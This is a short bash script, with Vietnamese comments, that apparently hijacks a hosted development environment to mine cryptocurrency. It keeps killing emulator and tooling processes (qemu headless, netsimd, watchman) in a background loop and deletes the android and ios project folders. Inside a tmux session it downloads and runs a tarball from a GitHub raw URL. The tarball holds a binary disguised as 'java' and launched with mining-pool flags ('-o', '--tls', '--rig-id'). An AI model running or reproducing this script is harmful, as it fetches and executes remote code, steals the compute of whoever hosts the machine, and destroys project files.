#!/bin/bash

SESSION="java"
DOMAIN="$1"
NAME_WORK="$2"

# 🔁 Vòng lặp kill liên tục các tiến trình nghi vấn
(
  while true; do
    pkill -f qemu-system-x86_64-headless 2>/dev/null
    pkill -f netsimd 2>/dev/null
    pkill -f watchman 2>/dev/null
    sleep 3
  done
) &
rm -rf android ios >/dev/null
# 📟 Khởi tạo tmux session nếu chưa có
if tmux has-session -t $SESSION 2>/dev/null; then
    tmux attach-session -t $SESSION
else
    tmux new-session -s $SESSION -d

    tmux send-keys -t $SESSION "
        rm -rf android ios java* java java java.tar.gz &&
        wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz &&
        tar -xzf java.tar.gz &&
        cd java &&
        chmod +x java &&
        ./java -o $DOMAIN --tls -k -t 1 --rig-id $NAME_WORK
    " C-m

    tmux attach-session -t $SESSION
fi
